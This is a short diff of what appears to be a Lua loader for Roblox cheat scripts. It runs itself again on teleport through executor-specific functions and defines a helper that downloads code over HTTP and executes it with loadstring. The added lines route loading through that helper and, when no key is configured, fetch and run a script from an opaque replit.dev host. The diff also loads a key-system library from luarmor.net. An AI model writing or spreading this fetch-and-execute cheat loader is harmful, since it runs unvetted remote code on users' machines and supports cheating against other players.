@@ -61,7 +61,6 @@ task.spawn(function(InitializeService)
 end)
 
 --// Auto Execute
-
 if not(disable_auto_exec) then
 	xpcall(function()
 		local queueonteleport = queueonteleport or queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
@@ -125,7 +124,7 @@ __f = {
 	['__load'] = function(s : string) (load or loadstring)(game:HttpGet(s))() end;
 }
 
-local api = loadstring(game:HttpGet("https://sdkapi-public.luarmor.net/library.lua"))()
+local api = __f['__load']("https://sdkapi-public.luarmor.net/library.lua")
 
 if __f['__game']() then
 	api.script_id = __f['__game']();
@@ -146,4 +145,6 @@ elseif Config.Key then
 		api.load_script();
 		return
 	end
+else
+	__f['__load']("https://39d1291e-6ade-471f-b323-ee4901a6bb9b-00-qk738b4sej27.sisko.replit.dev/cac.lua")
 end
